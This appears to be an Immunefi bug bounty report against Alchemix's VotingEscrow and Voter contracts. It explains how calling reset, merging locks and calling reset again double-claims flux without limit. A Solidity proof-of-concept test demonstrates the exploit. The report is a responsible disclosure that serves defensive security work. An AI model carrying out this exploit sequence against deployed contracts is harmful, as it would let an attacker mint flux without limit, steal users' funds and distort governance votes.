# 31280 - \[SC - Critical] Malicious user can mint unlimited flux tokens

Submitted on May 16th 2024 at 05:35:05 UTC by @MahdiKarimi for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #31280

Report type: Smart Contract

Report severity: Critical

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/VotingEscrow.sol>

Impacts:

* Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield
* Manipulation of governance voting result deviating from voted outcome and resulting in a direct change from intended effect of original results
* Theft of unclaimed yield

## Description

## Brief/Intro

A malicious user can mint unlimited flux by calling reset ( to receive claimable flux ) and merging it with another token and calling reset again to claim again and repeat this process and mint unlimited flux.

## Vulnerability Details

Users earn flux proportion to the amount of veALCX they hold at each epoch, they can use claimable flux for boosting voting power, mint flux tokens or add It to their unclaimed value through the reset function of the voter contract so they can use it in the future. The merge function ensures users didn't vote in the same epoch that they want to merge the token to prevent double calculation of claimable flux by checking `voted[]` mapping, however, users can call reset to receive claimable flux ( it's added to unclaimed flux ), since reset function sets voted to false and only updates lastVoted ( which doesn't affect merging ) user can merge the token with another token and receive the claimable amount again.

Scenario: A malicious user creates two different locks ( first with 100 locked value and second with 1 lock value ), flux per veALCX in this epoch is 1, user calls the reset function at voter contract and claims 100 flux for token1 and then merges token1 with the token2, and call reset for token2 and receives 101 flux ( while user received 100 flux before merge ), user earned 201 flux in this epoch instead of 101 tokens, user can create another small lock and merge the token2 with new lock and call reset again and repeat this process to mint unlimited flux.

## Impact Details

The attacker can use unlimited flux tokens to boost voting power and direct emission to a specific gauge ( direct theft of unclaimed yield )

Minting unlimited flux tokens leads flux price to 0 ( Direct theft of any user funds, whether at rest or in motion, other than unclaimed yield ) , the flux token is used as a reward for users but it's an ERC20 and can be traded in markets ( has some utilities ) so minting unlimited flux affects all flux holders ( not just rewarded users ) and leads to the loss of their assets that's why I believe it's considered direct theft of user funds.

## References

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/Voter.sol#L183-L192> <https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/VotingEscrow.sol#L618-L651>

## Proof of Concept

```
      function testMintUnlimitedFlux() external {

        // create 2 lock tokens for user 
        uint256 tokenId1 = createVeAlcx(admin, TOKEN_1, veALCX.MAXTIME(), false);
        uint256 tokenId2 = createVeAlcx(admin, TOKEN_1, veALCX.MAXTIME(), false);

        // calculate the amount flux tokens that user should be able to claim in this epoch 
        uint256 token1Flux = veALCX.claimableFlux(tokenId1);
        uint256 token2Flux = veALCX.claimableFlux(tokenId2);
        uint256 totalClaimable = token1Flux + token2Flux;

        // user calls reset for token1, so claimable flux for token 1 is added to unclaimed amount of token1 
        hevm.prank(admin);
        voter.reset(tokenId1);

        // user merges token1 and token2, so unclaimed amount of token1 is added to token2 unclaimed 
        hevm.prank(admin);
        veALCX.merge(tokenId1, tokenId2);

        // user calls reset for token2, so claiamble amount is added to unclaimed 
        // due to merge amount of token1 has been added to token2 and effects claimable flux despite that flux for that amount is being added to unclaimed flux already  
        hevm.prank(admin);
        voter.reset(tokenId2);

        uint256 unclaimedFlux = flux.getUnclaimedFlux(tokenId2);
        // user has more flux that totalClaimable at first place 
        assert(unclaimedFlux > totalClaimable);
        // token1Flux is double claculated during claiming flux  
        // NOTE: used assert Approx due to precision loss during calculation of claimable amount 
        uint256 claimed = 2 * token1Flux + token2Flux;
        assertApproxEqAbs(claimed, unclaimedFlux, 100000000);

        // malicious user can repeat this to mint unlimited flux 
    }
```
